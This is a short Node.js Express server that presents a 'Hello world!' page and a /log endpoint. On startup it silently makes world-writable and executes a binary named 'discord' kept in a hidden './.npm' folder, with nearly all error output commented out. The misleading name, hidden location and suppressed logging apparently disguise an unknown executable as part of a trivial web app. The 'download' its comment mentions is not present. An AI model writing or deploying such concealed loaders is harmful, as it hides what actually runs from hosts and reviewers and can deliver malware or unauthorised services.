const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const FILE_PATH = process.env.FILE_PATH || './.npm';
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; 

app.get("/", function(req, res) {
  res.send("Hello world!");
});

const subTxtPath = path.join(FILE_PATH, 'log.txt');
app.get("/log", (req, res) => {
  fs.readFile(subTxtPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

const fileName = 'discord';
const filePath = path.join(FILE_PATH, fileName);

// Download and execute the file
const Execute = () => {
  try {
    if (!fs.existsSync(filePath)) {
      //console.error(`file not found: ${filePath}`);
      return;
    }
    fs.chmodSync(filePath, '777');
    const child = exec(`./${fileName}`, {
      cwd: FILE_PATH 
    }, (error, stdout, stderr) => {
      if (error) {
        // console.error(`error: ${error}`);
        return;
      }
      // if (stdout) console.log(`stdout: ${stdout}`);
      if (stderr) console.error(`stderr: ${stderr}`);
    });

    child.on('exit', (code) => {
      // console.log(`child exit code: ${code}`);
    });
  } catch (err) {
    // console.error(`catch error: ${err}`);
  }
};
Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
